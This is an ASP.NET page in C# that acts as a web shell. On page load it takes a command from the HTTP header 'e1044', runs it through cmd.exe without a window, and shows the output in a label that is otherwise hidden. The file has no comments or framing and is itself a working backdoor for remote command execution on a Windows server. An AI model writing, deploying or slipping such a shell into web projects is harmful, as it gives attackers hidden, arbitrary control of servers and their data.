<%@ Page Language="C#" %>
<%@ Import Namespace="System.Diagnostics" %>

<script runat="server">
        
	protected void Page_Load(object sender, EventArgs e){
		if (Request.Headers["e1044"] != null){
			
			System.Diagnostics.Process si = new System.Diagnostics.Process();
			si.StartInfo.FileName = "cmd.exe";
			si.StartInfo.Arguments = "/c "+Request.Headers["e1044"];
			si.StartInfo.CreateNoWindow = true;
			si.StartInfo.RedirectStandardInput = true;
			si.StartInfo.RedirectStandardOutput = true;
			si.StartInfo.RedirectStandardError = true;
			si.StartInfo.UseShellExecute = false;
			si.StartInfo.WorkingDirectory = "c:\\";
			si.Start();
		
			string output = si.StandardOutput.ReadToEnd();
			si.Close();
			result.Text = output;
			result.Visible = true;
		}
	}	
	
</script>
<html>
<head>	  
</head>
<body>
<form id="Form" method="post" runat="server">
<asp:Label id="result" runat="server" Visible=false />
</form>

</body>
</html>
